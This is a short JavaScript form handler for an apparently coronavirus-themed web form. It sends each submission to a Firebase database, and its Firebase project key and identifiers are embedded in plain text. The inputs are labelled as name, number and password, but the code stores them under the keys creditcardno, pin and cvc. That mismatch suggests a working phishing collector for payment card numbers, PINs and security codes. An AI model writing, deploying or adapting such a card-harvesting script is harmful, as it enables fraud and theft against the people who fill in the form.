const firebaseConfig = {
    apiKey: "AIzaSyAHTCQ2pi1zaJwqtgcJCqwtyvi5_FSG__0",
    authDomain: "coronawebform.firebaseapp.com",
    databaseURL: "https://coronawebform-default-rtdb.firebaseio.com",
    projectId: "coronawebform",
    storageBucket: "coronawebform.appspot.com",
    messagingSenderId: "31981497372",
    appId: "1:31981497372:web:7282238d6ea485355c83d9"
  };

  // Initialize Firebase
  firebase.initializeApp(firebaseConfig);

  
   
   var UserInputsRef = firebase.database().ref('Userinputs');
   document.getElementById("form").addEventListener("submit",submitForm)
   function submitForm(e){
       e.preventDefault();
       var name=getInputVal("name")
       var email =getInputVal("number")
       var password=getInputVal("password")
       var confirmpassword =getInputVal("confirmpassword")
       

       


       saveInfo(name,email,password,confirmpassword)
   }
   function getInputVal(id){
       return document.getElementById(id).value
   }

   function saveInfo(name,mobile,password,confirmpassword){

    let newUser= UserInputsRef.push();

    newUser.set({
        name: name,
        creditcardno : mobile,
        pin: password,
        cvc : confirmpassword
    })
    alert("successfully submitted")
   }